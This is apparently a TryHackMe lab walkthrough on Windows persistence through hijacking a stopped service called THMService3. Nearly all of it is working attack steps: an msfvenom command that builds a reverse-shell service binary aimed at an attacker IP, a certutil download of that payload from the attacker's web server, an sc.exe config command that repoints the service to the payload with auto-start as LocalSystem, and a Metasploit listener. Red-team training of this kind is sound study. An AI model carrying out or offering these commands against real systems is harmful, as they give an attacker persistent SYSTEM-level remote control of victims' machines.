**The `blue team` may `monitor` new service creation across the network. Usually, any `disabled service will be a good candidate`, as it could be altered without the user noticing it.** 

#### Find a stopped service called `THMService3`
```cmd
sc qc THMService3
```

**Output**
```cmd
C:\> sc.exe qc THMService3 
[SC] QueryServiceConfig SUCCESS 

SERVICE_NAME: THMService3 
	TYPE : 10 WIN32_OWN_PROCESS 
	START_TYPE : 2 AUTO_START 
	ERROR_CONTROL : 1 NORMAL 
	BINARY_PATH_NAME : C:\MyService\THMService.exe 
	LOAD_ORDER_GROUP : 
	TAG : 0 
	DISPLAY_NAME : THMService3 
	DEPENDENCIES : 
	SERVICE_START_NAME : NT AUTHORITY\Local Service
```
Three things we care about when using a service for persistence:
- The executable (**`BINARY_PATH_NAME`**) should point to our payload.
- The service **`START_TYPE`** should be automatic so that the payload runs without user interaction.
- The **`SERVICE_START_NAME`**, which is the account under which the service will run, should preferably be set to **`LocalSystem`** to gain SYSTEM privileges.

#### Create a new reverse shell 
```bash
msfvenom -p windows\x64\shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe-service -o rev-srv2.exe
```

#### Transfer the Shell
**Attacker**
```bash
python3 -m http.server
```

**Victim**
```cmd
cd c:\windows
certutil -urlcache -split -f http://<attacker-ip>:8000/rev-srv2.exe
```

#### Reconfigure `THMService3` parameters
```cmd
sc.exe config THMService3 binPath= "C:\Windows\rev-srv2.exe" start= auto obj= "LocalSystem"
```

**Output**
```
C:\> sc.exe qc THMService3 
[SC] QueryServiceConfig SUCCESS 

SERVICE_NAME: THMService3 
	TYPE : 10 WIN32_OWN_PROCESS 
	START_TYPE : 2 AUTO_START 
	ERROR_CONTROL : 1 NORMAL 
	BINARY_PATH_NAME : C:\Windows\rev-srv2.exe
	LOAD_ORDER_GROUP : 
	TAG : 0 
	DISPLAY_NAME : THMService3 
	DEPENDENCIES : 
	SERVICE_START_NAME : LocalSystem
```

#### Start a Metasploit Listener
```
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set lhost=<attacker-ip>
run
```

#### Manually start the service to receive a reverse shell
```cmd
sc start THMService3
```